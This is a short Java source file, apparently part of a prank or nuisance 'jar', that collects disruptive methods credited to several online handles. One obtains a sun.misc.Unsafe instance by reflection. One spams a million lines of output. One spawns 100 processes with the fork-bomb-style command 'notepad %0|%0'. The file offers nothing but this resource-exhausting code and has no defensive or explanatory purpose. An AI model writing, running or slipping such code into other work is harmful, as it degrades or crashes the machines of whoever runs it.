package tv.circuitrcay.cancerjar;


import sun.misc.Unsafe;

import java.io.IOException;
import java.lang.reflect.Constructor;

public class CancerShit {
    // From Natan#1289
    public static Unsafe createUnsafe() throws Exception {
        Constructor<Unsafe> ctor = Unsafe.class.getDeclaredConstructor();
        ctor.setAccessible(true);
        return ctor.newInstance();
    }
    // From Skweezi Leekz#2426
    public static void spamSucc() {
        for(int i=0; i<1000000; i++) {
            System.out.println("FREE SUCC!!!");
        }
    }
    // From Kodehawa#3457
    public static void notepad() throws IOException {
        Runtime runtime = Runtime.getRuntime();
        for(int i=0; i<100; i++) {
            Process process = runtime.exec("notepad %0|%0");
        }
    }
}
